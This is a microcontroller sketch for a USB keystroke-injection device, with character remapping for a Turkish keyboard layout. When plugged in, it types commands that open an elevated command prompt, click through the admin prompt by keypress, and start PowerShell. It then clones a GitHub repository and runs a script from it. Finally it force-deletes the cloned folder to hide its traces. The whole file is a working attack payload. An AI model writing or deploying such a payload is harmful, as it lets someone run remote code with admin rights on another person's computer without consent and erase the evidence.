#include "USB.h"

#include "USBHIDKeyboard.h"



USBHIDKeyboard Keyboard;

void trPrint(const String &text) {
  for (int i = 0; i < text.length(); i++) {
    char c = text[i];

    switch (c) {
     
      case '"':
        Keyboard.write('\'');
        break;

      
      case 'i':
        Keyboard.write(']');
        break;

     
      case '.':
        Keyboard.write('/');
        break;

  
      case ':':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.write('/');
        Keyboard.release(KEY_LEFT_SHIFT);
        break;

     
      case '/':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.write('7');
        Keyboard.release(KEY_LEFT_SHIFT);
        break;

      case '\\':
        Keyboard.press(KEY_RIGHT_ALT);
        Keyboard.press('-');
        delay(10);
        Keyboard.releaseAll();
        break;

      case '-':
        Keyboard.write('=');
        break;

      
      case '_':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.write('=');
        Keyboard.release(KEY_LEFT_SHIFT);
        break;

      default:
        
        if (c >= 'A' && c <= 'Z') {
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.write(tolower(c));
          Keyboard.release(KEY_LEFT_SHIFT);
        } else {
          Keyboard.write(c);
        }
        break;
    }

    delay(12);
  }
}



void setup() {

  USB.begin();

  Keyboard.begin();



 

  delay(2000);




  Keyboard.press(KEY_LEFT_GUI);

  Keyboard.press('r');

  delay(100);

  Keyboard.releaseAll();

  delay(500);




  Keyboard.print("cmd");

  delay(100);

  Keyboard.press(KEY_LEFT_CTRL);

  Keyboard.press(KEY_LEFT_SHIFT);

  Keyboard.write(KEY_RETURN);

  Keyboard.releaseAll();

  delay(1200);



  Keyboard.write(KEY_LEFT_ARROW);

  delay(400);

  Keyboard.write(KEY_RETURN);

  delay(1500);





  trPrint("powershell");

  delay(300);

  Keyboard.write(KEY_RETURN);

  delay(1000);





 

  trPrint("git clone https://github.com/SoyluEren2004/BashExe.git");

  Keyboard.write(KEY_RETURN);

  delay(4000);




  trPrint("cd BashExe");

  Keyboard.write(KEY_RETURN);

  delay(500);



  

  trPrint(".\\app.sh");

  Keyboard.write(KEY_RETURN);

  delay(3000);



  Keyboard.press(KEY_LEFT_ALT);

  Keyboard.press(KEY_F4);

  delay(100);

  Keyboard.releaseAll();

  delay(500);

  Keyboard.write(KEY_LEFT_ARROW);

  delay(400);

  Keyboard.write(KEY_RETURN);

  delay(1500);

 

  trPrint("cd ..");

  Keyboard.write(KEY_RETURN);

  delay(1500);



  trPrint("Remove-Item -Path BashExe -Recurse -Force");

  Keyboard.write(KEY_RETURN);

  delay(3000);



  trPrint("exit");

  Keyboard.write(KEY_RETURN);

  delay(300);

  trPrint("exit");

  Keyboard.write(KEY_RETURN);

  delay(300);


}
